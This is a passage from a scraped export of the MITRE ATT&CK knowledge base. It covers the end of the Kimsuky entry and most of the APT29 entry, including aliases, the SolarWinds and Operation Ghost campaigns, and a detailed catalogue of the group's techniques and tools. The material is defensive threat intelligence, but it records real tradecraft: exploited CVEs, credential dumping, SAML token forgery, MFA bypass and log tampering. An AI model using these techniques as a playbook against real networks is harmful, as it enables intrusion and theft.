Discovery, System Owner/User Discovery, System Time Discovery S0029 PsExec [7] Create Account: Domain Account, Create or Modify System Process: Windows Service, Lateral Tool Transfer, Remote Services: SMB/Windows Admin Shares, System Services: Service Execution S0262 QuasarRAT [5][17] Abuse Elevation Control Mechanism: Bypass User Account Control, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores, Data from Local System, Encrypted Channel: Symmetric Cryptography, Hide Artifacts: Hidden Window, Hide Artifacts: Hidden Files and Directories, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Non-Application Layer Protocol, Non-Standard Port, Proxy, Remote Services: Remote Desktop Protocol, Scheduled Task/Job: Scheduled Task, Subvert Trust Controls: Code Signing, System Information Discovery, System Location Discovery, System Network Configuration Discovery, System Owner/User Discovery, Unsecured Credentials: Credentials In Files, Video Capture S0111 schtasks [2][15] Scheduled Task/Job: Scheduled Task S1201 TRANSLATEXT [22] Application Layer Protocol: Web Protocols, Browser Session Hijacking, Command and Scripting Interpreter: PowerShell, Credentials from Password Stores: Credentials from Web Browsers, Email Collection, Exfiltration Over C2 Channel, Masquerading: Match Legitimate Resource Name or Location, Modify Registry, Query Registry, Screen Capture, Software Extensions: Browser Extensions, Steal Web Session Cookie, Traffic Signaling, Web Service: Dead Drop Resolver, Web Service: Bidirectional Communication S1196 Troll Stealer Troll Stealer is exclusively linked to Kimsuky operations.[24][14][26] Application Layer Protocol: Web Protocols, Archive Collected Data, Browser Information Discovery, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Data Encoding: Standard Encoding, Data from Information Repositories, Data from Local System, Data Staged: Local Data Staging, Encrypted Channel: Symmetric Cryptography, Execution Guardrails: Mutual Exclusion, Exfiltration Over C2 Channel, File and Directory Discovery, Indicator Removal: File Deletion, Masquerading: Match Legitimate Resource Name or Location, Obfuscated Files or Information: Software Packing, Screen Capture, Subvert Trust Controls: Code Signing, System Binary Proxy Execution: Rundll32, System Information Discovery, System Network Configuration Discovery, Unsecured Credentials: Private Keys References Alyac. (2019, April 3). Kimsuky Organization Steals Operation Stealth Power. Retrieved August 13, 2019. Dahan, A. et al. (2020, November 2). Back to the Future: Inside the Kimsuky KGH Spyware Suite. Retrieved November 6, 2020. Jazi, H. (2021, June 1). Kimsuky APT continues to target South Korean government using AppleSeed backdoor. Retrieved June 10, 2021. CISA, FBI, CNMF. (2020, October 27). https://us-cert.cisa.gov/ncas/alerts/aa20-301a. Retrieved November 4, 2020. Mandiant. (2024, March 14). APT43: North Korean Group Uses Cybercrime to Fund Espionage Operations. Retrieved May 3, 2024. Lesnewich, G. et al. (2024, April 16). From Social Engineering to DMARC Abuse: TA427\u2019s Art of Information Gathering. Retrieved May 3, 2024. ASERT team. (2018, December 5). STOLEN PENCIL Campaign Targets Academia. Retrieved February 5, 2019. ESTSecurity. (2019, April 17). Analysis of the APT Campaign \u2018Smoke Screen\u2019 targeting to Korea and US \ucd9c\ucc98: https://blog.alyac.co.kr/2243 [\uc774\uc2a4\ud2b8\uc2dc\ud050\ub9ac\ud2f0 \uc54c\uc57d \ube14\ub85c\uadf8]. Retrieved September 29, 2021. AhnLab. (2019, February 28). Operation Kabar Cobra - Tenacious cyber-espionage campaign by Kimsuky Group. Retrieved September 29, 2021. Microsoft Threat Intelligence. (2024, February 14). Staying ahead of threat actors in the age of AI. Retrieved March 11, 2024. Cimpanu, C.. (2018, December 5). Cyber-espionage group uses Chrome extension to infect victims. Retrieved August 26, 2019. ThreatConnect. (2020, September 28). Kimsuky Phishing Operations Putting In Work. Retrieved October 30, 2020. Microsoft . (2023, July 12). How Microsoft names threat actors. Retrieved November 17, 2023. Symantec Threat Hunter Team. (2024, May 16). Springtail: New Linux Backdoor Added to Toolkit. Retrieved January 17, 2025. KISA. (2021). Phishing Target Reconnaissance and Attack Resource Analysis Operation Muzabi. Retrieved March 8, 2024. Cimpanu, C. (2020, September 30). North Korea has tried to hack 11 officials of the UN Security Council. Retrieved November 4, 2020. Mandiant. (n.d.). APT43: North Korean Group Uses Cybercrime to Fund Espionage Operations. Retrieved October 14, 2024. An, J and Malhotra, A. (2021, November 10). North Korean attackers use malicious blogs to deliver malware to high-profile South Korean targets. Retrieved December 29, 2021. Kim, J. et al. (2019, October). KIMSUKY GROUP: TRACKING THE KING OF THE SPEAR PHISHING. Retrieved November 2, 2020. Tarakanov , D.. (2013, September 11). The \u201cKimsuky\u201d Operation: A North Korean APT?. Retrieved August 13, 2019. Crowdstrike. (2020, March 2). 2020 Global Threat Report. Retrieved December 11, 2020. Park, S. (2024, June 27). Kimsuky deploys TRANSLATEXT to target South Korean academia. Retrieved October 14, 2024. Hossein Jazi. (2021, June 1). Kimsuky APT continues to target South Korean government using AppleSeed backdoor. Retrieved January 10, 2024. Jiho Kim & Sebin Lee, S2W. (2024, February 7). Kimsuky disguised as a Korean company signed with a valid certificate to distribute Troll Stealer (English ver.). Retrieved January 17, 2025. OpenAI. (2024, February 14). Disrupting malicious uses of AI by state-affiliated threat actors. Retrieved September 12, 2024. AhnLab ASEC. (2024, February 16). TrollAgent That Infects Systems Upon Security Program Installation Process (Kimsuky Group). Retrieved January 17, 2025. "
},
{
"id": 157,
"title": "APT29, IRON RITUAL, IRON HEMLOCK, NobleBaron, Dark Halo, NOBELIUM, UNC2452, YTTRIUM, The Dukes, Cozy Bear, CozyDuke, SolarStorm, Blue Kitsune, UNC3524, Midnight Blizzard, Group G0016",
"path": "/groups/G0016/index.html",
"content": " APT29 APT29 is threat group that has been attributed to Russia's Foreign Intelligence Service (SVR).[1][2] They have operated since at least 2008, often targeting government networks in Europe and NATO member countries, research institutes, and think tanks. APT29 reportedly compromised the Democratic National Committee starting in the summer of 2015.[3][4][5][6] In April 2021, the US and UK governments attributed the SolarWinds Compromise to the SVR; public statements included citations to APT29, Cozy Bear, and The Dukes.[7][8] Industry reporting also referred to the actors involved in this campaign as UNC2452, NOBELIUM, StellarParticle, Dark Halo, and SolarStorm.[9][10][11][12][13][14] ID: G0016 \u24d8 Associated Groups: IRON RITUAL, IRON HEMLOCK, NobleBaron, Dark Halo, NOBELIUM, UNC2452, YTTRIUM, The Dukes, Cozy Bear, CozyDuke, SolarStorm, Blue Kitsune, UNC3524, Midnight Blizzard Contributors: Daniyal Naeem, BT Security; Matt Brenton, Zurich Insurance Group; Katie Nickels, Red Canary; Joe Gumke, U.S. Bank; Liran Ravich, CardinalOps; Vicky Ray, RayvenX Version: 6.2 Created: 31 May 2017 Last Modified: 04 April 2025 Version Permalink Live Version Associated Group Descriptions Name Description IRON RITUAL [15] IRON HEMLOCK [16] NobleBaron [17] Dark Halo [12] NOBELIUM [10][18][19][20] UNC2452 [9] YTTRIUM [21] The Dukes [3][22][23][13] Cozy Bear [5][22][23][13][24] CozyDuke [5] SolarStorm [14] Blue Kitsune [25][26] UNC3524 [27] Midnight Blizzard [28] Campaigns ID Name First Seen Last Seen References Techniques C0023 Operation Ghost September 2013 [22] October 2019 [22] [22] Acquire Infrastructure: Domains, Data Obfuscation: Steganography, Develop Capabilities: Malware, Establish Accounts: Social Media Accounts, Event Triggered Execution: Windows Management Instrumentation Event Subscription, Obfuscated Files or Information: Steganography, Valid Accounts: Domain Accounts, Web Service: Bidirectional Communication C0024 SolarWinds Compromise August 2019 [14] January 2021 [18] [7][8][29] Account Discovery: Domain Account, Account Discovery, Account Manipulation: Additional Email Delegate Permissions, Account Manipulation: Additional Cloud Roles, Account Manipulation: Device Registration, Account Manipulation: Additional Cloud Credentials, Acquire Infrastructure: Domains, Application Layer Protocol: Web Protocols, Archive Collected Data: Archive via Utility, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Compromise Infrastructure: Domains, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores, Data from Information Repositories, Data from Information Repositories: Code Repositories, Data from Local System, Data Staged: Remote Data Staging, Deobfuscate/Decode Files or Information, Develop Capabilities: Malware, Domain or Tenant Policy Modification: Trust Modification, Domain Trust Discovery, Dynamic Resolution, Email Collection: Remote Email Collection, Event Triggered Execution: Windows Management Instrumentation Event Subscription, Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol, Exploit Public-Facing Application, External Remote Services, File and Directory Discovery, Forge Web Credentials: SAML Tokens, Forge Web Credentials: Web Cookies, Gather Victim Identity Information: Credentials, Hide Infrastructure, Impair Defenses: Disable or Modify Tools, Impair Defenses: Disable Windows Event Logging, Impair Defenses: Disable or Modify System Firewall, Indicator Removal: File Deletion, Indicator Removal: Timestomp, Indicator Removal, Indicator Removal: Clear Mailbox Data, Ingress Tool Transfer, Masquerading: Match Legitimate Resource Name or Location, Masquerading: Masquerade Task or Service, OS Credential Dumping: DCSync, Permission Groups Discovery: Domain Groups, Permission Groups Discovery, Process Discovery, Proxy: Internal Proxy, Remote Services: Remote Desktop Protocol, Remote Services: SMB/Windows Admin Shares, Remote Services: Windows Remote Management, Remote System Discovery, Scheduled Task/Job: Scheduled Task, Steal or Forge Kerberos Tickets: Kerberoasting, Steal Web Session Cookie, Subvert Trust Controls: Code Signing, Supply Chain Compromise: Compromise Software Supply Chain, System Binary Proxy Execution: Rundll32, System Information Discovery, System Network Configuration Discovery: Internet Connection Discovery, Trusted Relationship, Unsecured Credentials: Private Keys, Use Alternate Authentication Material, Use Alternate Authentication Material: Application Access Token, Use Alternate Authentication Material: Web Session Cookie, Valid Accounts: Cloud Accounts, Valid Accounts: Domain Accounts, Valid Accounts: Local Accounts, Valid Accounts, Windows Management Instrumentation Techniques Used Domain ID Name Use Enterprise T1548 .002 Abuse Elevation Control Mechanism: Bypass User Account Control APT29 has bypassed UAC.[30] Enterprise T1087 .002 Account Discovery: Domain Account During the SolarWinds Compromise, APT29 used PowerShell to discover domain accounts by exectuing Get-ADUser and Get-ADGroupMember.[24][15] .004 Account Discovery: Cloud Account APT29 has conducted enumeration of Azure AD accounts.[31] Enterprise T1098 .001 Account Manipulation: Additional Cloud Credentials During the SolarWinds Compromise, APT29 added credentials to OAuth Applications and Service Principals.[32][24] .002 Account Manipulation: Additional Email Delegate Permissions APT29 has used a compromised global administrator account in Azure AD to backdoor a service principal with ApplicationImpersonation rights to start collecting emails from targeted mailboxes; APT29 has also used compromised accounts holding ApplicationImpersonation rights in Exchange to collect emails.[33][27] During the SolarWinds Compromise, APT29 added their own devices as allowed IDs for active sync using Set-CASMailbox, allowing it to obtain copies of victim mailboxes. It also added additional permissions (such as Mail.Read and Mail.ReadWrite) to compromised Application or Service Principals.[12][32][31] .003 Account Manipulation: Additional Cloud Roles During the SolarWinds Compromise, APT29 granted company administrator privileges to a newly created service principle.[24] .005 Account Manipulation: Device Registration APT29 has enrolled their own devices into compromised cloud tenants, including enrolling a device in MFA to an Azure AD environment following a successful password guessing attack against a dormant account.[33][34] During the SolarWinds Compromise, APT29 registered devices in order to enable mailbox syncing via the Set-CASMailbox command.[12] Enterprise T1583 .001 Acquire Infrastructure: Domains For the SolarWinds Compromise, APT29 acquired C2 domains, sometimes through resellers.[10][35] For Operation Ghost, APT29 registered domains for use in C2 including some crafted to appear as existing legitimate domains.[22] .006 Acquire Infrastructure: Web Services APT29 has registered algorithmically generated Twitter handles that are used for C2 by malware, such as HAMMERTOSS. APT29 has also used legitimate web services such as Dropbox and Constant Contact in their operations.[36][18] Enterprise T1595 .002 Active Scanning: Vulnerability Scanning APT29 has conducted widespread scanning of target environments to identify vulnerabilities for exploit.[13] Enterprise T1071 .001 Application Layer Protocol: Web Protocols During the SolarWinds Compromise, APT29 used HTTP for C2 and data exfiltration.[12] Enterprise T1560 .001 Archive Collected Data: Archive via Utility During the SolarWinds Compromise, APT29 used 7-Zip to compress stolen emails into password-protected archives prior to exfltration; APT29 also compressed text files into zipped archives.[12][37][24] Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder APT29 added Registry Run keys to establish persistence.[30] Enterprise T1037 Boot or Logon Initialization Scripts APT29 has hijacked legitimate application-specific startup scripts to enable malware to execute on system startup.[27] .004 RC Scripts APT29 has installed a run command on a compromised system to enable malware execution on system startup.[27] Enterprise T1110 .001 Brute Force: Password Guessing APT29 has successfully conducted password guessing attacks against a list of mailboxes.[33] .003 Brute Force: Password Spraying APT29 has conducted brute force password spray attacks.[20][31][34] Enterprise T1651 Cloud Administration Command APT29 has used Azure Run Command and Azure Admin-on-Behalf-of (AOBO) to execute code on virtual machines.[31] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell APT29 has used encoded PowerShell scripts uploaded to CozyCar installations to download and install SeaDuke.[38][30][39][16] During the SolarWinds Compromise, APT29 used PowerShell to create new tasks on remote machines, identify configuration settings, exfiltrate data, and execute other commands.[12][40][24] .003 Command and Scripting Interpreter: Windows Command Shell During the SolarWinds Compromise, APT29 used cmd.exe to execute commands on remote machines.[12][40] .005 Command and Scripting Interpreter: Visual Basic For the SolarWinds Compromise, APT29 wrote malware such as Sibot in Visual Basic.[13] .006 Command and Scripting Interpreter: Python APT29 has developed malware variants written in Python.[38] .009 Command and Scripting Interpreter: Cloud API APT29 has leveraged the Microsoft Graph API to perform various actions across Azure and M365 environments. They have also utilized AADInternals PowerShell Modules to access the API [19] Enterprise T1586 .002 Compromise Accounts: Email Accounts APT29 has compromised email accounts to further enable phishing campaigns and taken control of dormant accounts.[41][33] .003 Compromise Accounts: Cloud Accounts APT29 has used residential proxies, including Azure Virtual Machines, to obfuscate their access to victim environments.[33] Enterprise T1584 .001 Compromise Infrastructure: Domains For the SolarWinds Compromise, APT29 compromised domains to use for C2.[10] Enterprise T1136 .003 Create Account: Cloud Account APT29 can create new users through Azure AD.[31] Enterprise T1555 .003 Credentials from Password Stores: Credentials from Web Browsers During the SolarWinds Compromise, APT29 stole users' saved passwords from Chrome.[24] Enterprise T1213 Data from Information Repositories During the SolarWinds Compromise, APT29 accessed victims' internal knowledge repositories (wikis) to view sensitive corporate information on products, services, and internal business operations.[24] .003 Code Repositories During the SolarWinds Compromise, APT29 downloaded source code from code repositories.[42] Enterprise T1005 Data from Local System APT29 has stolen data from compromised hosts.[27] During the SolarWinds Compromise, APT29 extracted files from compromised networks.[12] Enterprise T1001 .002 Data Obfuscation: Steganography During Operation Ghost, APT29 used steganography to hide the communications between the implants and their C&C servers.[22] Enterprise T1074 .002 Data Staged: Remote Data Staging During the SolarWinds Compromise, APT29 staged data and files in password-protected archives on a victim's OWA server.[12] Enterprise T1140 Deobfuscate/Decode Files or Information During the SolarWinds Compromise, APT29 used 7-Zip to decode their Raindrop malware.[43] Enterprise T1587 .001 Develop Capabilities: Malware APT29 has used unique malware in many of their operations.[3][30][19][27] For the SolarWinds Compromise, APT29 used numerous pieces of malware that were likely developed for or by the group, including SUNBURST, SUNSPOT, Raindrop, and TEARDROP.[9][11][37] For Operation Ghost, APT29 used new strains of malware including FatDuke, MiniDuke, RegDuke, and PolyglotDuke.[22] .003 Develop Capabilities: Digital Certificates APT29 has created self-signed digital certificates to enable mutual TLS authentication for malware.[25][26] Enterprise T1484 .002 Domain or Tenant Policy Modification: Trust Modification During the SolarWinds Compromise, APT29 changed domain federation trust settings using Azure AD administrative permissions to configure the domain to accept authorization tokens signed by their own SAML signing certificate.[15][44] Enterprise T1482 Domain Trust Discovery During the SolarWinds Compromise, APT29 used the Get-AcceptedDomain PowerShell cmdlet to enumerate accepted domains through an Exchange Management Shell.[12] They also used AdFind to enumerate domains and to discover trust between federated domains.[24][37] Enterprise T1568 Dynamic Resolution APT29 has used Dynamic DNS providers for their malware C2 infrastructure.[27] During the SolarWinds Compromise, APT29 used dynamic DNS resolution to construct and resolve to randomly-generated subdomains for C2.[12] Enterprise T1114 .002 Email Collection: Remote Email Collection APT29 has collected emails from targeted mailboxes within a compromised Azure AD tenant and compromised Exchange servers, including via Exchange Web Services (EWS) API requests.[33][27] During the SolarWinds Compromise, APT29 collected emails from specific individuals, such as executives and IT staff, using New-MailboxExportRequest followed by Get-MailboxExportRequest.[12][13] Enterprise T1573 Encrypted Channel APT29 has used multiple layers of encryption within malware to protect C2 communication.[16] Enterprise T1585 .001 Establish Accounts: Social Media Accounts For Operation Ghost, APT29 registered Twitter accounts to host C2 nodes.[22] Enterprise T1546 .003 Event Triggered Execution: Windows Management Instrumentation Event Subscription APT29 has used WMI event subscriptions for persistence.[30] During the SolarWinds Compromise, APT29 used a WMI event filter to invoke a command-line event consumer at system boot time to launch a backdoor with rundll32.exe.[37][44] During Operation Ghost, APT29 used WMI event subscriptions to establish persistence for malware.[22] .008 Event Triggered Execution: Accessibility Features APT29 used sticky-keys to obtain unauthenticated, privileged console access.[30][45] Enterprise T1048 .002 Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol During the SolarWinds Compromise, APT29 exfiltrated collected data over a simple HTTPS request to a password-protected archive staged on a victim's OWA servers.[12] Enterprise T1190 Exploit Public-Facing Application APT29 has exploited CVE-2019-19781 for Citrix, CVE-2019-11510 for Pulse Secure VPNs, CVE-2018-13379 for FortiGate VPNs, and CVE-2019-9670 in Zimbra software to gain access.[13][23] During the SolarWinds Compromise, APT29 exploited CVE-2020-0688 against the Microsoft Exchange Control Panel to regain access to a network.[12][13] Enterprise T1203 Exploitation for Client Execution APT29 has used multiple software exploits for common client software, like Microsoft Word, Exchange, and Adobe Reader, to gain code execution.[3][13][18] Enterprise T1068 Exploitation for Privilege Escalation APT29 has exploited CVE-2021-36934 to escalate privileges on a compromised host.[39] Enterprise T1133 External Remote Services APT29 has used compromised identities to access networks via VPNs and Citrix.[23][33] For the SolarWinds Compromise, APT29 used compromised identities to access networks via SSH, VPNs, and other remote access tools.[10][24] Enterprise T1083 File and Directory Discovery During the SolarWinds Compromise, APT29 obtained information about the configured Exchange virtual directory using Get-WebServicesVirtualDirectory.[12] Enterprise T1606 .001 Forge Web Credentials: Web Cookies During the SolarWinds Compromise, APT29 bypassed MFA set on OWA accounts by generating a cookie value from a previously stolen secret key.[12] .002 Forge Web Credentials: SAML Tokens During the SolarWinds Compromise, APT29 created tokens using compromised SAML signing certificates.[32][15] Enterprise T1589 .001 Gather Victim Identity Information: Credentials For the SolarWinds Compromise, APT29 conducted credential theft operations to obtain credentials to be used for access to victim environments.[24] Enterprise T1665 Hide Infrastructure APT29 uses compromised residential endpoints, typically within the same ISP IP address range, as proxies to hide the true source of C2 traffic.[34] During the SolarWinds Compromise, APT29 set the hostnames of their C2 infrastructure to match legitimate hostnames in the victim environment. They also used IP addresses originating from the same country as the victim for their VPN infrastructure.[9] Enterprise T1562 .001 Impair Defenses: Disable or Modify Tools During the SolarWinds Compromise, APT29 used the service control manager on a remote system to disable services associated with security monitoring products.[37] .002 Impair Defenses: Disable Windows Event Logging During the SolarWinds Compromise, APT29, used AUDITPOL to prevent the collection of audit logs.[37] .004 Impair Defenses: Disable or Modify System Firewall During the SolarWinds Compromise, APT29 used netsh to configure firewall rules that limited certain UDP outbound packets.[37] .008 Impair Defenses: Disable or Modify Cloud Logs APT29 has disabled Purview Audit on targeted accounts prior to stealing emails from Microsoft 365 tenants.[33] Enterprise T1070 .004 Indicator Removal: File Deletion APT29 has used SDelete to remove artifacts from victim networks.[30] During the SolarWinds Compromise, APT29 routinely removed their tools, including custom backdoors, once remote access was achieved.[9] .006 Indicator Removal: Timestomp APT29 has used timestomping to alter the Standard Information timestamps on their web shells to match other files in the same directory.[27] During the SolarWinds Compromise, APT29 modified timestamps of backdoors to match legitimate Windows files.[37] .008 Indicator Removal: Clear Mailbox Data During the SolarWinds Compromise, APT29 removed evidence of email export requests using Remove-MailboxExportRequest.[12] Enterprise T1105 Ingress Tool Transfer APT29 has downloaded additional tools and malware onto compromised networks.[30][25][3][27] During the SolarWinds Compromise, APT29 downloaded additional malware, such as TEARDROP and Cobalt Strike, onto a compromised host following initial access.[9] Enterprise T1036 .004 Masquerading: Masquerade Task or Service During the SolarWinds Compromise, APT29 named tasks \\Microsoft\\Windows\\SoftwareProtectionPlatform\\EventCacheManager in order to appear legitimate.[12] .005 Masquerading: Match Legitimate Resource Name or Location APT29 has renamed malicious DLLs with legitimate names to appear benign; they have also created an Azure AD certificate with a Common Name that matched the display name of the compromised service principal.[17][33] During the SolarWinds Compromise, APT29 renamed software and DLLs with legitimate names to appear benign.[12][40] Enterprise T1556 .007 Modify Authentication Process: Hybrid Identity APT29 has edited the Microsoft.IdentityServer.Servicehost.exe.config file to load a malicious DLL into the AD FS process, thereby enabling persistent access to any service federated with AD FS for a user with a specified User Principal Name.[46] Enterprise T1621 Multi-Factor Authentication Request Generation APT29 has used repeated MFA requests to gain access to victim accounts.[47][34] Enterprise T1027 .001 Obfuscated Files or Information: Binary Padding APT29 used large size files to avoid detection by security solutions with hardcoded size limits.[17] .002 Obfuscated Files or Information: Software Packing APT29 used UPX to pack files.[30] .003 Obfuscated Files or Information: Steganography During Operation Ghost, APT29 used steganography to hide payloads inside valid images.[22] .006 Obfuscated Files or Information: HTML Smuggling APT29 has embedded an ISO file within an HTML attachment that contained JavaScript code to initiate malware execution.[39] Enterprise T1588 .002 Obtain Capabilities: Tool APT29 has obtained and used a variety of tools including Mimikatz, SDelete, Tor, meek, and Cobalt Strike.[30][3][27] Enterprise T1003 .002 OS Credential Dumping: Security Account Manager APT29 has used the reg save command to save registry hives.[27] .004 OS Credential Dumping: LSA Secrets APT29 has used the reg save command to extract LSA secrets offline.[27] .006 OS Credential Dumping: DCSync During the SolarWinds Compromise, APT29 used privileged accounts to replicate directory service data with domain controllers.[44][37][24] Enterprise T1069 .002 Permission Groups Discovery: Domain Groups During the SolarWinds Compromise, APT29 used AdFind to enumerate domain groups.[24] Enterprise T1566 .001 Phishing: Spearphishing Attachment APT29 has used spearphishing emails with an attachment to deliver files with exploits to initial victims.[3][18][39][16] .002 Phishing: Spearphishing Link APT29 has used spearphishing with a link to trick victims into clicking on a link to a zip file containing malicious files.[30][18][48] .003 Phishing: Spearphishing via Service APT29 has used the legitimate mailing service Constant Contact to send phishing e-mails.[18] Enterprise T1057 Process Discovery During the SolarWinds Compromise, APT29 used multiple command-line utilities to enumerate running processes.[12][37][24] Enterprise T1090 .001 Proxy: Internal Proxy During the SolarWinds Compromise, APT29 used SSH port forwarding capabilities on public-facing systems, and configured at least one instance of Cobalt Strike to use a network pipe over SMB.[24][43] .002 Proxy: External Proxy APT29 uses compromised residential endpoints as proxies for defense evasion and network access.[34] .003 Proxy: Multi-hop Proxy A backdoor used by APT29 created a Tor hidden service to forward traffic from the Tor client to local ports 3389 (RDP), 139 (Netbios), and 445 (SMB) enabling full remote access from outside the network and has also used TOR.[30][31] .004 Proxy: Domain Fronting APT29 has used the meek domain fronting plugin for Tor to hide the destination of C2 traffic.[30] Enterprise T1021 .001 Remote Services: Remote Desktop Protocol During the SolarWinds Compromise, APT29 used RDP sessions from public-facing systems to internal servers.[24] .002 Remote Services: SMB/Windows Admin Shares During the SolarWinds Compromise, APT29 used administrative accounts to connect over SMB to targeted users.[24] .006 Remote Services: Windows Remote Management During the SolarWinds Compromise, APT29 used WinRM via PowerShell to execute commands and payloads on remote hosts.[43] .007 Remote Services: Cloud Services APT29 has leveraged compromised high-privileged on-premises accounts synced to Office 365 to move laterally into a cloud environment, including through the use of Azure AD PowerShell.[49] Enterprise T1018 Remote System Discovery During the SolarWinds Compromise, APT29 used AdFind to enumerate remote systems.[37] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task APT29 has used named and hijacked scheduled tasks to establish persistence.[30] During the SolarWinds Compromise, APT29 used scheduler and schtasks to create new tasks on remote host as part of their lateral movement. They manipulated scheduled tasks by updating an existing legitimate task to execute their tools and then returned the scheduled task to its original configuration. APT29 also created a scheduled task to maintain SUNSPOT persistence when the host booted.[12][9][11] Enterprise T1505 .003 Server Software Component: Web Shell APT29 has installed web shells on exploited Microsoft Exchange servers.[13][27] Enterprise T1528 Steal Application Access Token APT29 uses stolen tokens to access victim accounts, without needing a password.[34] Enterprise T1649 Steal or Forge Authentication Certificates APT29 has abused misconfigured AD CS certificate templates to impersonate admin users and create additional authentication certificates.[50] Enterprise T1558 .003 Steal or Forge Kerberos Tickets: Kerberoasting During the SolarWinds Compromise, APT29 obtained Ticket Granting Service (TGS) tickets for Active Directory Service Principle Names to crack offline.[37] Enterprise T1539 Steal Web Session Cookie During the SolarWinds Compromise, APT29 stole Chrome browser cookies by copying the Chrome profile directories of targeted users.[24] Enterprise T1553 .002 Subvert Trust Controls: Code Signing During the SolarWinds Compromise, APT29 was able to get SUNBURST signed by SolarWinds code signing certificates by injecting the malware into the SolarWinds Orion software lifecycle.[9] .005 Subvert Trust Controls: Mark-of-the-Web Bypass APT29 has embedded ISO images and VHDX files in HTML to evade Mark-of-the-Web.[39] Enterprise T1195 .002 Supply Chain Compromise: Compromise Software Supply Chain During the SolarWinds Compromise, APT29 gained initial network access to some victims via a trojanized update of SolarWinds Orion software.[51][9][13][37] Enterprise T1218 .005 System Binary Proxy Execution: Mshta APT29 has use mshta to execute malicious scripts on a compromised host.[39] .011 System Binary Proxy Execution: Rundll32 During the SolarWinds Compromise, APT29 used Rundll32.exe to execute payloads.[32][37] Enterprise T1082 System Information Discovery During the SolarWinds Compromise, APT29 used fsutil to check available free space before executing actions that might create large files on disk.[37] Enterprise T1016 .001 System Network Configuration Discovery: Internet Connection Discovery APT29 has ensured web servers in a victim environment are Internet accessible before copying tools or malware to it.[27] During the SolarWinds Compromise, APT29 used GoldFinder to perform HTTP GET requests to check internet connectivity and identify HTTP proxy servers and other redirectors that an HTTP request travels through.[10] Enterprise T1199 Trusted Relationship APT29 has compromised IT, cloud services, and managed services providers to gain broad access to multiple customers for subsequent operations.[31] During the SolarWinds Compromise, APT29 gained access through compromised accounts at cloud solution partners, and used compromised certificates issued by Mimecast to authenticate to Mimecast customer systems.[13][24] Enterprise T1552 .004 Unsecured Credentials: Private Keys During the SolarWinds Compromise, APT29 obtained PKI keys, certificate files, and the private encryption key from an Active Directory Federation Services (AD FS) container to decrypt corresponding SAML signing certificates.[44][13] Enterprise T1550 .001 Use Alternate Authentication Material: Application Access Token During the SolarWinds Compromise, APT29 used compromised service principals to make changes to the Office 365 environment.[24] .003 Use Alternate Authentication Material: Pass the Ticket APT29 used Kerberos ticket attacks for lateral movement.[30] .004 Use Alternate Authentication Material: Web Session Cookie During the SolarWinds Compromise, APT29 used stolen cookies to access cloud resources and a forged duo-sid cookie to bypass MFA set on an email account.[12][24] Enterprise T1204 .001 User Execution: Malicious Link APT29 has used various forms of spearphishing attempting to get a user to click on a malicious link.[18][48] .002 User Execution: Malicious File APT29 has used various forms of spearphishing attempting to get a user to open attachments, including, but not limited to, malicious Microsoft Word documents, .pdf, and .lnk files. [3][39][16] Enterprise T1078 Valid Accounts APT29 has used a compromised account to access an organization's VPN infrastructure.[33] During the SolarWinds Compromise, APT29 used different compromised credentials for remote access and to move laterally.[9][10][13] .002 Domain Accounts During the SolarWinds Compromise, APT29 used domain administrators' accounts to help facilitate lateral movement on compromised networks.[24] For Operation Ghost, APT29 used stolen administrator credentials for lateral movement on compromised networks.[22] .003 Local Accounts APT29 targets dormant or inactive user accounts, accounts belonging to individuals no longer at the organization but whose accounts remain on the system, for access and persistence.[34] During the SolarWinds Compromise, APT29 used compromised local accounts to access victims' networks.[24] .004 Cloud Accounts APT29 has gained access to a global administrator account in Azure AD and has used Service Principal credentials in Exchange.[33][27] During the SolarWinds Compromise, APT29 used a compromised O365 administrator account to create a new Service Principal.[24] Enterprise T1102 .002 Web Service: Bidirectional Communication For Operation Ghost, APT29 used social media platforms to hide communications to C2 servers.[22] Enterprise T1047 Windows Management Instrumentation APT29 used WMI to steal credentials and execute backdoors at a future time.[30] During the SolarWinds Compromise, APT29 used WMI for the remote execution of files for lateral movement.[44][37] Software ID Name References Techniques S0677 AADInternals [31] Account Discovery: Cloud Account, Account Manipulation: Device Registration, Cloud Administration Command, Cloud Service Discovery, Command and Scripting Interpreter: PowerShell, Create Account: Cloud Account, Data from Cloud Storage, Domain or Tenant Policy Modification: Trust Modification, Exfiltration Over Alternative Protocol, Forge Web Credentials: SAML Tokens, Gather Victim Identity Information: Email Addresses, Gather Victim Network Information: Domain Properties, Modify Authentication Process: Hybrid Identity, Modify Authentication Process: Multi-Factor Authentication, Modify Registry, OS Credential Dumping: LSA Secrets, Permission Groups Discovery: Cloud Groups, Phishing: Spearphishing Link, Phishing for Information: Spearphishing Link, Steal Application Access Token, Steal or Forge Authentication Certificates, Steal or Forge Kerberos Tickets: Silver Ticket, Unsecured Credentials: Credentials In Files, Unsecured Credentials: Private Keys S0552 AdFind [40][24][39] Account Discovery: Domain Account, Domain Trust Discovery, Permission Groups Discovery: Domain Groups, Remote System Discovery, System Network Configuration Discovery S0521 BloodHound [39] Account Discovery: Domain Account, Account Discovery: Local Account, Archive Collected Data, Command and Scripting Interpreter: PowerShell, Domain Trust Discovery, Group Policy Discovery, Native API, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Remote System Discovery, System Owner/User Discovery S0635 BoomBox [19] Account Discovery: Domain Account, Account Discovery: Email Account, Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Deobfuscate/Decode Files or Information, Execution Guardrails, Exfiltration Over Web Service: Exfiltration to Cloud Storage, File and Directory Discovery, Ingress Tool Transfer, Masquerading, Obfuscated Files or Information, System Binary Proxy Execution: Rundll32, System Information Discovery, System Owner/User Discovery, User Execution: Malicious File, Web Service S0054 CloudDuke [3] Application Layer Protocol: Web Protocols, Ingress Tool Transfer, Web Service: Bidirectional Communication S0154 Cobalt 